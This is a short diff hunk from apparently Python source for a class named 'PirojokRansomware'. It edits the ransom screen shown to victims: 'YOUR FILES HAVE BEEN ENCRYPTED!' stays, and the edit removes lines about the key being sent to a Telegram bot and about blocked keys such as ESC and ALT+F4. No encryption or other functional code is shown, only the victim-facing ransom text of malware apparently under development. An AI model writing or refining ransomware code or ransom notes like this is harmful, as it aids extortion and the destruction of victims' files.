@@ -851,12 +851,9 @@ class PirojokRansomware:
 |                                                              |
 |   YOUR FILES HAVE BEEN ENCRYPTED!                            |
 |                                                              |
-|   DECRYPTION KEY HAS BEEN SENT TO TELEGRAM                   |
-|   CHECK YOUR TELEGRAM BOT FOR THE KEY                        |
 |                                                              |
-|   KEYS F1-F12, ESC, SHIFT, CTRL, ALT+F4 ARE BLOCKED!        |
 |                                                              |
-|   To unlock, enter decryption key in Telegram bot            |
+|   To unlock, enter decryption key                            |
 |                                                              |
 +--------------------------------------------------------------+
             """
